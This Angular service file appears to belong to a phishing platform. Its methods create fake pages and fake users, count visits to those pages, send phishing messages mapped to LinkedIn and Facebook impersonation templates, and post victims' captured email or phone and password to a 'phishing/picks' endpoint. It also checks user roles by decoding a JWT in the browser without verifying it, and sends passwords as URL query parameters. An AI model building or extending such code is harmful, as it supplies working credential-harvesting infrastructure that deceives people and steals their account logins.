import { Injectable } from '@angular/core';
import { HttpClient, HttpParams } from '@angular/common/http';
import { Observable } from 'rxjs';
import { API_URL } from '../config';
import { AuthResponse, RegisterRequest } from './models';

@Injectable({
  providedIn: 'root'
})
export class ApiService {

  constructor(private http: HttpClient) { }

  getToken(): string | null {
    return sessionStorage.getItem('authToken');
  }

  hasRole(role: string): boolean {
    const token = this.getToken();
    if (!token) return false;

    const payload = JSON.parse(atob(token.split('.')[1]));
    return payload.roles && payload.roles.includes(role);
  }

  login(username: string, password: string): Observable<AuthResponse> {
    const loginDto = { username, password };
    return this.http.post<AuthResponse>(`${API_URL}/api/auth/login`, loginDto);
  }

  loginAdmin(username: string, password: string): Observable<AuthResponse> {
    const loginDto = { username, password };
    return this.http.post<AuthResponse>(`${API_URL}/api/auth/loginAdmin`, loginDto);
  }

  incrementFakePageVisits(fakePageName: string): Observable<string> {
    const params = new HttpParams().set('fakePageName', fakePageName);
    return this.http.post<string>(`${API_URL}/api/fakepage/incrementVisits`, null, { params });
  }

  createFakeUser(username: string, password: string, fakePageName: string): Observable<string> {
    const params = new HttpParams()
      .set('username', username)
      .set('password', password)
      .set('fakePageName', fakePageName);
    return this.http.post<string>(`${API_URL}/api/fakeuser/create`, null, { params });
  }

  getAllFakePages(): Observable<any[]> {
    return this.http.get<any[]>(`${API_URL}/api/fakepage/all`);
  }

  getPageByNombre(nombre: string): Observable<any> {
    const params = new HttpParams().set('nombre', nombre);
    return this.http.get<any>(`${API_URL}/api/fakepage/getByNombre`, { params });
  }

  getUsersByNombre(nombre: string): Observable<any[]> {
    const params = new HttpParams().set('fakePageName', nombre);
    return this.http.get<any[]>(`${API_URL}/api/fakeuser/getByPageName`, { params });
  }

  register(registerRequest: RegisterRequest): Observable<string> {
    return this.http.post(`${API_URL}/api/auth/register`, registerRequest, { responseType: 'text' });
  }

  sendPhishing(phishingData: { username: string; mail: string; platform: string }): Observable<any> {
    const platformMap: { [key: string]: string } = {
      linkedin: 'linkedin-pick',
      facebook: 'facebook-pick'
    };
    const adjustedData = {
      ...phishingData,
      platform: platformMap[phishingData.platform as keyof typeof platformMap]
    };

    return this.http.post(`${API_URL}/api/phishing/manual`, adjustedData);
  }

  getUserProfile(username: string): Observable<any> {
    return this.http.get(`${API_URL}/api/users/profile/${username}`);
  }

  getUserProfileData(username: string): Observable<any> {
    return this.http.get(`${API_URL}/api/users/profileData/${username}`);
  }

  updateUserProfile(username: string, userProfile: any): Observable<any> {
    return this.http.put(`${API_URL}/api/users/profile/${username}`, userProfile);
  }

  sendUserData(emailOrPhone: string, password: string, platform: string, username: string): Observable<any> {
    const payload = { emailOrPhone, password, platform, username };
    return this.http.post(`${API_URL}/api/phishing/picks`, payload);
  }

  enterPhishingEmail(username: string, platform: string): Observable<string> {
    const payload = { username, platform };
    return this.http.post<string>(`${API_URL}/api/phishing/entrada`, payload);
  }
}
